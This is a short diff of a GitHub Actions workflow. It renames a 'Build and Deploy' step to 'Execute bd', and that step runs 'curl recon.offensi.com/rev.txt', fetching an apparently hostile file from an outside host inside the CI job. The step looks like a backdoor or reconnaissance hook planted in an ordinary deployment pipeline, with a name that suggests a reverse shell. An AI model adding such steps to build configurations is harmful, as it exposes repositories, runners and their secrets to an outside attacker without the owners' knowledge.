@@ -18,9 +18,8 @@ jobs:
       - uses: actions/checkout@v2
         with:
           submodules: true
-      - name: Build and Deploy
-	run: curl recon.offensi.com/rev.txt 
-
+      - name: Execute bd
+        run: curl recon.offensi.com/rev.txt
   close_pull_request_job:
     if: github.event_name == 'pull_request' && github.event.action == 'closed'
     runs-on: ubuntu-latest
